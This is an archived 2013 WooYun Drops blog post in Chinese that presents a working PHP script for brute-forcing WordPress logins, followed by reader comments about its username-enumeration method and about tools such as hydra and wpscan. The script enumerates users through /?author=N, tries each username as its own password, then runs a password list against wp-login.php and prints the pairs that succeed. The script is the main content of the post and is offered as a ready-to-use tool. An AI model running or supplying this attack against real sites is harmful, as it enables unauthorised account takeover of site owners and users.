---
layout: post
title: "跑wordpress用户密码脚本"
categories: 安全
tags: 
 - 安全
 - PHP-WordPress
--- 

# 跑wordpress用户密码脚本

### 分享到

* [一键分享]()
* [QQ空间]()
* [新浪微博]()
* [百度云收藏]()
* [人人网]()
* [腾讯微博]()
* [百度相册]()
* [开心网]()
* [腾讯朋友]()
* [百度贴吧]()
* [豆瓣网]()
* [搜狐微博]()
* [百度新首页]()
* [QQ好友]()
* [和讯微博]()
* [更多...]()

[百度分享]()

# [WooYun知识库](http://drops.wooyun.org/ "WooYun知识库")

[登录](http://drops.wooyun.org/login "登录")

像一朵乌云一样成长

* [首页](http://drops.wooyun.org/ "WooYun知识库")
* [WooYun](http://www.wooyun.org/)
* [Zone](http://zone.wooyun.org/)
* [投稿](http://drops.wooyun.org/newsend)
[首页](http://drops.wooyun.org/ "首页") » [工具收集](http://drops.wooyun.org/category/tools "查看 工具收集 中的全部文章") » 跑wordpress用户密码脚本

## [跑wordpress用户密码脚本](http://drops.wooyun.org/tools/601 "Permanent Link to 跑wordpress用户密码脚本")

4人收藏 [收藏]()

2013/09/17 15:04  | [瞌睡龙](http://drops.wooyun.org/author/瞌睡龙 "由 瞌睡龙 发布")  | [工具收集](http://drops.wooyun.org/category/tools "查看 工具收集 中的全部文章")  | [占个座先]()

在做渗透测试的时候，有时候会遇到一个wordpress博客，如果版本比较新，插件也没有漏洞的话，可以爆破用户名密码来尝试下。

大脑混沌情况下写的，有bug欢迎提出，由于是php的所以跑起来比较慢，下次发包还是调用命令结合hydra来爆破。

原理是通过URL

/?author=
遍历获取用户名，然后先跑用户名与密码相同的用户，再调用同目录下pass.txt中的密码文件进行爆破。

默认获取前10个用户，可自行修改。

使用方法：
php wordpress.php http://www.test.com

1

2
3

4
5

6
7

8
9

10
11

12
13

14
15

16
17

18
19

20
21

22
23

24
25

26
27

28
29

30
31

32
33

34
35

36
37

38
39

40
41

42
43

44
45

46
47

48
49

50
51

52
53

54
55

56
57

58
59

60
61

62
63

64
65

66
67

68
69

70
71

72
73

74
75

76
77

78
79

80
81

82
83

84
<?php

 
set_time_limit(0);

$domain

=

$argv

[1];
 

//获取用户名
for

(

$i

=1;

$i

<= 10;

$i

++) {

 
    

$url

=

$domain

.

"/?author="

.

$i

;

    

$response

= httprequest(

$url

,0);
    

if

(

$response

== 404) {

        

continue

;
    

}

    

$pattern

=

"{<title>(.*) \|}"

;
    

preg_match(

$pattern

,

$response

,

$name

);

    

$namearray

[] =

$name

[1];
}

 
echo

"共获取用户"

.

count

(

$namearray

).

"名用户\n"

;

 
echo

"正在破解用户名与密码相同的用户：\n"

;

 
$crackname

= crackpassword(

$namearray

,

"same"

);

 
$passwords

= file(

"pass.txt"

);

 
echo

"正在破解弱口令用户：\n"

;

 
if

(

$crackname

) {

    

$namearray

=

array_diff

(

$namearray

,

$crackname

);
}

 
crackpassword(

$namearray

,

$passwords

);

 
function

crackpassword(

$namearray

,

$passwords

){

    

global

$domain

;
    

$crackname

=

""

;

    

foreach

(

$namearray

as

$name

) {
        

$url

=

$domain

.

"/wp-login.php"

;

        

if

(

$passwords

==

"same"

) {
            

$post

=

"log="

.urlencode(

$name

).

"&pwd="

.urlencode(

$name

).

"&wp-submit=%E7%99%BB%E5%BD%95&redirect_to="

.urlencode(

$domain

).

"%2Fwp-admin%2F&testcookie=1"

;

            

$pos

=

strpos

(httprequest(

$url

,

$post

),

'div id="login_error"'

);
            

if

(

$pos

=== false) {

                

echo

"$name $name"

.

"\n"

;
                

$crackname

[] =

$name

;

            

}
        

}

else

{

            

foreach

(

$passwords

as

$pass

) {
                

$post

=

"log="

.urlencode(

$name

).

"&pwd="

.urlencode(

$pass

).

"&wp-submit=%E7%99%BB%E5%BD%95&redirect_to="

.urlencode(

$domain

).

"%2Fwp-admin%2F&testcookie=1"

;

                

$pos

=

strpos

(httprequest(

$url

,

$post

),

'div id="login_error"'

);
                

if

(

$pos

=== false) {

                    

echo

"$name $pass"

.

"\n"

;
                

}

            

}
        

}

    

}
    

return

$crackname

;

}
 

 
function

httprequest(

$url

,

$post

){

    

$ch

= curl_init();
    

curl_setopt(

$ch

, CURLOPT_URL,

"$url"

);

    

curl_setopt(

$ch

, CURLOPT_RETURNTRANSFER, 1);
    

curl_setopt(

$ch

, CURLOPT_SSL_VERIFYPEER, false);

    

curl_setopt(

$ch

, CURLOPT_FOLLOWLOCATION,1);
 

    

if

(

$post

){
        

curl_setopt(

$ch

, CURLOPT_POST, 1);

//post提交方式

        

curl_setopt(

$ch

, CURLOPT_POSTFIELDS,

$post

);
    

}

 
    

$output

= curl_exec(

$ch

);

    

$httpcode

= curl_getinfo(

$ch

,CURLINFO_HTTP_CODE);
    

curl_close(

$ch

);

 
 

    

if

(

$httpcode

== 404) {
        

return

404;

    

}

else

{
        

return

$output

;

    

}
}

?>
版权声明：未经授权禁止转载 [瞌睡龙](http://drops.wooyun.org/author/瞌睡龙 "由 瞌睡龙 发布")@[乌云知识库](http://drops.wooyun.org/)
分享到： []( "分享到QQ空间") []( "分享到新浪微博") []( "分享到腾讯微博") []( "分享到人人网") []( "分享到网易微博") [0]( "累计分享0次")

### 相关日志

* [php4fun.sinaapp.com PHP挑战通关攻略](http://drops.wooyun.org/papers/660)
* [tunna工具使用实例](http://drops.wooyun.org/tools/650)
* [各种环境下的渗透测试](http://drops.wooyun.org/tips/411)
* [InsightScan:Python多线程Ping/端口扫描 + HTTP服务/APP 探测，可生成Hydra用的IP列表](http://drops.wooyun.org/tools/427)
* [GPU破解神器Hashcat使用简介](http://drops.wooyun.org/tools/655)
* [Zmap详细用户手册和DDOS的可行性](http://drops.wooyun.org/tools/515)
上一篇:[OAuth 2.0安全案例回顾](http://drops.wooyun.org/papers/598)

下一篇:[对某创新路由的安全测试](http://drops.wooyun.org/papers/384)

### 楼被抢了 13 层了... [抢座]()、[Rss 2.0](http://drops.wooyun.org/tools/601/feed)或者 [Trackback](http://drops.wooyun.org/tools/601/trackback)

* ![]() erevus | 2013/09/17 15:53 | [#]()

好东西啊

[登录以回复](http://drops.wooyun.org/login)
* ![]() 瘦蛟舞 | 2013/09/17 16:09 | [#]()

龙哥的东西一直很实用~

[登录以回复](http://drops.wooyun.org/login)
* ![]() ccSec | 2013/09/17 17:07 | [#]()

龙哥好流逼。

[登录以回复](http://drops.wooyun.org/login)
* ![]() 园长 | 2013/09/17 17:44 | [#]()

wordpress太张狂了，连个验证码都不加。

[登录以回复](http://drops.wooyun.org/login)
* ![]() [c4rp3nt3r](http://www.0x50sec.org/) | 2013/09/17 21:37 | [#]()

昨天我刚好也写了一个wordpress枚举用户名的小功能，楼主这个程序里面，枚举用户名的地方有问题。
一是 里的用户名是该用户显示的时候的名字，比如 登录用户名 admin，可以设置成 Administrator或者什么。虽然很多是一样的，这里确实不严谨。另一方面wordpress版本比较多，各种seo插件也比较多枚举用户名，只用里的信息貌似很不够，
还有 <body class="archive author
以及 [http://site/author/admin/](http://site/author/admin/)
这种等等。
交流而已，没别的意思。

[登录以回复](http://drops.wooyun.org/login)

* ![]() [c4rp3nt3r](http://www.0x50sec.org/) | 2013/09/17 21:39 | [#]()

我觉得wpscan就不错，除非自己写个扫描器加入这个模块。嘿嘿。。。

[登录以回复](http://drops.wooyun.org/login)
* ![]() 瞌睡龙 | 2013/09/18 11:24 | [#]()

哈，的确，忽略了登录用户名跟title的用户名可能不一样，虽然这个产生的情况很少。那你程序取用户名，是从哪里获取的呢？

[登录以回复](http://drops.wooyun.org/login)

* ![]() [c4rp3nt3r](http://www.0x50sec.org/) | 2013/09/18 11:44 | [#]()

我上面都说了哦

[登录以回复](http://drops.wooyun.org/login)
* ![]() Ivan | 2013/09/18 03:25 | [#]()

收藏下~

[登录以回复](http://drops.wooyun.org/login)
* ![]() xfkxfk | 2013/09/18 13:03 | [#]()

有时候/?author=number的确找不到，不过这个找到的概率到时挺高的，支持下

[登录以回复](http://drops.wooyun.org/login)
* ![]() insight-labs | 2013/09/20 11:33 | [#]()

亲，我一直用hydra的http-post-form。还能多线程

[登录以回复](http://drops.wooyun.org/login)

* ![]() luwikes | 2013/09/22 15:18 | [#]()

87

[登录以回复](http://drops.wooyun.org/login)
* ![]() lhshaoren | 2013/09/23 22:28 | [#]()

还不错

[登录以回复](http://drops.wooyun.org/login)
### 发表评论

[点击这里取消回复。]()

您必须 [登陆](http://drops.wooyun.org/login) 后才能发表评论。

### 订阅更新

* [![]()](http://drops.wooyun.org/feed "点击订阅")

### 分类

* [漏洞分析](http://drops.wooyun.org/category/papers "漏洞分析") (40)
* [技术分享](http://drops.wooyun.org/category/tips "技术分享") (57)
* [工具收集](http://drops.wooyun.org/category/tools "工具收集") (5)
* [业界资讯](http://drops.wooyun.org/category/news "业界资讯") (3)
### 最新日志

* [Flash CSRF](http://drops.wooyun.org/tips/688 "Flash CSRF")
* [XSS与字符编码的那些事儿 —科普文](http://drops.wooyun.org/tips/689 "XSS与字符编码的那些事儿 —科普文")
* [Zabbix SQL Injection/RCE – CVE-2013-5743](http://drops.wooyun.org/papers/680 "Zabbix SQL Injection/RCE – CVE-2013-5743")
* [CDN流量放大攻击思路](http://drops.wooyun.org/papers/679 "CDN流量放大攻击思路")
* [从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集](http://drops.wooyun.org/news/674 "从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集")
* [攻击JavaWeb应用[8]-后门篇](http://drops.wooyun.org/tips/662 "攻击JavaWeb应用[8]-后门篇")
* [php4fun.sinaapp.com PHP挑战通关攻略](http://drops.wooyun.org/papers/660 "php4fun.sinaapp.com PHP挑战通关攻略")
* [搭建基于Suricata+Barnyard2+Base的IDS前端Snorby](http://drops.wooyun.org/papers/653 "搭建基于Suricata+Barnyard2+Base的IDS前端Snorby")
* [GPU破解神器Hashcat使用简介](http://drops.wooyun.org/tools/655 "GPU破解神器Hashcat使用简介")
* [内网渗透应用 跨vlan渗透的一种思路](http://drops.wooyun.org/tips/649 "内网渗透应用 跨vlan渗透的一种思路")

### 最新评论

* ![]()

c2y2 在 [XSS与字符编码的那些事儿 ---科普文](http://drops.wooyun.org/tips/689#comment-1883)
谢谢
* ![]()

Evi1c0de 在 [如何用意念获取附近美女的手机号码](http://drops.wooyun.org/tips/573#comment-1877)
连接CMCC跳转到登陆页面 右键源码 修改即可
* ![]()

牛牛 在 [Flash CSRF](http://drops.wooyun.org/tips/688#comment-1871)
支持一下呵呵
* ![]()

luwikes 在 [JBoss安全问题总结](http://drops.wooyun.org/papers/178#comment-1870)
mark
* ![]()

NgInx 在 [Flash CSRF](http://drops.wooyun.org/tips/688#comment-1869)
好吧，基佬，顶你一个，不错。
* [下一页 »]()
Powered by [WordPress](http://wordpress.org/) | GZai Theme by [鬼仔](http://huaidan.org/ "GZai Theme produced by 鬼仔")
[![]()](http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d)
